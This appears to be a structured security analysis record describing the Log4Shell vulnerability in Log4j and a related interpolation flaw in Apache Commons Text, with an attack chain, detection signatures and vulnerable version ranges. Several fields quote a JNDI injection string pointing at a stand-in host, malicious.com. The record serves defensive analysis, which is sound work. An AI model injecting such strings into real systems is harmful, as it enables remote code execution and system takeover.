package_info.why_malicious: The affected versions of Log4j contain a critical vulnerability (Log4Shell) that allows attackers to trigger remote code execution by injecting specially crafted strings into log messages, which are then interpreted and executed via JNDI lookups. This enables attackers to execute arbitrary code on vulnerable systems, making the package as shipped in these versions highly dangerous.

execution_context.trigger: runtime (when a log message is processed)
execution_context.file_location: Any Java file using Log4j logging methods (e.g., log.info(), log.error())

malicious_snippets.code_behavior: At runtime, when a log message containing the string '${jndi:ldap://malicious.com/malwarepayload}' is processed, Log4j performs a JNDI lookup to the specified LDAP server, retrieves and executes remote code, resulting in arbitrary code execution on the vulnerable server.

malice_analysis.why_suspicious: This behavior allows untrusted user input to trigger network requests and load/execute code from remote servers, which is a classic remote code execution vector.
malice_analysis.violated_expectations: Normal logging libraries should treat log messages as inert data, not as code or instructions to perform network lookups or execute remote code.
malice_analysis.similar_legitimate_use: JNDI lookups are legitimate in enterprise Java for resource discovery, but not in the context of processing untrusted log messages.
key_indicators: Use of ${jndi:...} patterns in log messages
Automatic network requests triggered by log message content
Execution of code retrieved from remote servers

execution_context.file_location: Any Java file using Apache Commons Text's StringSubstitutor or similar interpolation features

malicious_snippets.code_language: java (string processed by Apache Commons Text)
malicious_snippets.code_behavior: At runtime, when a string containing '${prefix:name}' is interpolated by Apache Commons Text, the library may resolve the prefix to a remote resource or perform a lookup that can result in remote code execution if the prefix is mapped to a dangerous lookup (e.g., script, url, dns, or jndi).

malice_analysis.why_suspicious: Allowing arbitrary prefixes in variable interpolation can enable attackers to trigger network requests or code execution by controlling the input string.
malice_analysis.violated_expectations: Variable interpolation should not allow untrusted input to trigger network lookups or code execution.
malice_analysis.similar_legitimate_use: Variable interpolation is common for configuration, but should be limited to safe, local lookups.
key_indicators: Unrestricted variable interpolation with user-controlled prefixes
Support for dangerous lookups (jndi, url, script) in input strings

attack_chain.action: Attacker injects a specially crafted string (e.g., '${jndi:ldap://malicious.com/malwarepayload}') into any input that will be logged or interpolated.
attack_chain.leads_to: Triggering of remote lookup by the vulnerable library

attack_chain.action: The vulnerable library (Log4j or Apache Commons Text) processes the string, performs a JNDI or other remote lookup, and retrieves code or data from the attacker's server.
attack_chain.leads_to: Remote code execution on the vulnerable system

attack_chain.action: Attacker gains arbitrary code execution, potentially taking full control of the affected system.
attack_chain.leads_to: System compromise and potential lateral movement

behavioral_signatures: Log messages or interpolated strings containing '${jndi:' or similar variable interpolation patterns
Unexpected outbound LDAP, RMI, or other JNDI-related network requests from application servers
Execution of code or loading of classes from remote servers triggered by log or configuration input
file_indicators: Presence of vulnerable Log4j versions (2.0-beta9 through 2.14.1) in dependency manifests (pom.xml, build.gradle, etc.)
Use of Apache Commons Text versions prior to 1.10.0
Log files or application logs containing suspicious interpolation patterns
network_indicators: Outbound LDAP, RMI, or DNS requests to untrusted or unexpected domains
Connections to attacker-controlled infrastructure (e.g., malicious.com, webhook.site, etc.)
detection_knowledge.how_to_detect: Monitor application logs and network traffic for suspicious variable interpolation patterns such as '${jndi:' or '${prefix:'. Audit dependency manifests for vulnerable versions of Log4j and Apache Commons Text. Alert on unexpected outbound LDAP, RMI, or DNS requests from application servers, especially those triggered by log or configuration input. Use static analysis to identify code paths where untrusted input is passed to logging or interpolation functions.
